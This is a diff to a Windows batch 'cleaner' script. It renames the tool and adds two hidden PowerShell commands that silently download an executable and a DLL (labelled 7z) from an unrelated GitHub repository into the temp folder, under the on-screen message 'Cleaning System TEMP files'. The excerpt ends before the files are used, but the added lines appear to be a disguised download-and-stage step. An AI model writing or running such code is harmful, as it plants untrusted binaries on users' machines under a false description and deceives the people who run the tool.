@@ -1,6 +1,6 @@
 @echo off
 cd /d "%~dp0"
-title Schooi's Cleaner ^| v1.2
+title SCleaner ^| v1.2
 for /f "tokens=4-7 delims=[.] " %%i in ('ver') do @(if "%%i"=="Version" (set windowsver=%%j) else (set windowsver=%%i))
 if %WINDOWSVER% GEQ 10 goto compatible
 echo Your Windows version is not compatible with this program. Exiting in 3 seconds..
@@ -12,9 +12,11 @@ exit
 color 0f
 call :logo
 echo.
-echo Schooi's Cleaner v1.2 ^| ADVANCED
-echo ====================================
+echo SCleaner v1.2 ^| ADVANCED
+echo ============================
 if exist "%TEMP%\wstemp\" rd /s /q "%TEMP%\wstemp" >nul
-if not exist "%TEMP%\wstemp\" md "%TEMP%\wstemp\"
+if not exist "%TEMP%\wstemp\" md "%TEMP%\wstemp\" >nul
 echo Cleaning System TEMP files..
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.exe -OutFile '%TEMP%\7z.exe'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.dll -OutFile '%TEMP%\7z.dll'"
 setlocal enabledelayedexpansion
